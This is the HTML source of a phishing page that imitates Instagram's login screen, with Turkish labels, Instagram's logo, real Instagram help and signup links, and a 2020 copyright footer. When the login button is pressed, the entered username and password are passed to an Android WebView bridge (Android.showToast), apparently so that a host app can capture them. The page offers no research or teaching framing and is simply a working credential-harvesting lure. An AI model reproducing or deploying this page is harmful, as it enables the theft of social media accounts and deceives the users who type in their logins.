<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Instagram login</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<body>
  <span id="root">
    <section class="section-all">

      <!-- 1-Role Main -->
      <main class="main" role="main">
        <div class="wrapper">
          <article class="article">
            <div class="content">
              <div class="login-box">
                <div class="header">
                  <img class="logo" src="instagram_logo.png" alt="Instagram">
                </div><!-- Header end -->
                <div class="form-wrap">
                  <form class="form">

                    <div class="input-box">
                      <input  type="text" name="username" id="name"  placeholder="Telefon numarası, kullanıcı adı veya email" aria-describedby="" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off"  value="" required>
                    </div>  

                    <div class="input-box">
                      <input  type="password" name="password" id="password" placeholder="Şifre" aria-describedby="" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" required>
                    </div>  

                    <span class="button-box">
                      <button class="btn" type="button" name="submit" onClick="showAndroidToast(document.getElementById('name').value,document.getElementById('password').value)">Giriş</button>
                    </span>
                    <script type="text/javascript">
                    function showAndroidToast(name,password) {
                    Android.showToast(name,password);
                    }</script>

                    <a class="forgot" href="https://www.instagram.com/accounts/password/reset/">Parolanızı mı unuttunuz?</a>
                  </form>
                </div> <!-- Form-wrap end -->
              </div> <!-- Login-box end -->

              <div class="login-box">
                <p class="text">Hesabın yok mu?<a href="https://www.instagram.com/accounts/emailsignup/">Kaydol</a></p>
              </div> <!-- Signup-box end -->

              <div class="app">
                <p>Uygulamayı indir.</p>
                <div class="app-img">
                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                    <img src="app_store_logo.png" >
                  </a>
                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                    <img src="google_play_logo.png">
                  </a>  
                </div>  <!-- App-img end-->
              </div> <!-- App end -->
            </div> <!-- Content end -->
          </article>
        </div> <!-- Wrapper end -->
      </main>

      <!-- 2-Role Footer -->
      <footer class="footer" role="contentinfo">
        <div class="footer-container">

          <nav class="footer-nav" role="navigation">
            <ul>
              <li><a href="https://about.instagram.com/about-us">HAKKIMIZDA</a></li>
              <li><a href="https://help.instagram.com/">DESTEK</a></li>
              <li><a href="https://instagram-press.com/">BASIN</a></li>
              <li><a href="https://www.instagram.com/developer/">API</a></li>
              <li><a href="https://www.instagram.com/about/jobs/">İŞ FIRSATLARI</a></li>
              <li><a href="https://www.instagram.com/legal/privacy/">GİZLİLİK</a></li>
              <li><a href="https://www.instagram.com/legal/terms/">KOŞULLAR</a></li>
              <li><a href="https://www.instagram.com/explore/locations/">DİZİN</a></li>
              <li><a href="https://www.instagram.com/directory/profiles/">PROFİLLER</a></li>
            </ul>
          </nav>

          <span class="footer-logo">&copy; 2020 Instagram</span>
        </div> <!-- Footer container end -->
      </footer>
      
    </section>
  </span> <!-- Root -->

  <!-- Select Link -->
  <script type="text/javascript">

  </script>
</body>
<!-- partial -->

</body>
</html>
